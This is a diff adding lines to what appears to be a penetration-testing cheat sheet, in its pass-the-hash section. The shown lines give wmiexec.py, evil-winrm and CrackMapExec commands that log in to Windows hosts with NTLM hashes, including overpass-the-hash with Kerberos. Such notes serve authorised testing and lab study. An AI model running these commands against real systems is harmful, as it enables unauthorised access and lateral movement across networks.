@@ -605,6 +605,10 @@ If you have path traversal plus a location with write access you can exploit tha
   `wmiexec.py ralph/user1@10.11.1.31 -hashes aad3b435b51404eeaad3b435b51404ee:7a21990fcd3d759941e45c490f143d5f`  
 - connect to target with evil-winrm:   
   `evil-winrm -i <IP> -u <username> -H <ntlm hash>`   
+- CME PTH:   
+  `cme smb 172.16.1.1 -u Administrator -H 7facdc498ed1680c4fd1448319a8c04f`   
+  Overpass the hash with CME (using kerberos auth):   
+  `cme smb 172.16.1.1 -u Administrator -H 7facdc498ed1680c4fd1448319a8c04f -k`   
 
 ## Mimikatz
 - First Mimikatz commands: (run always)  
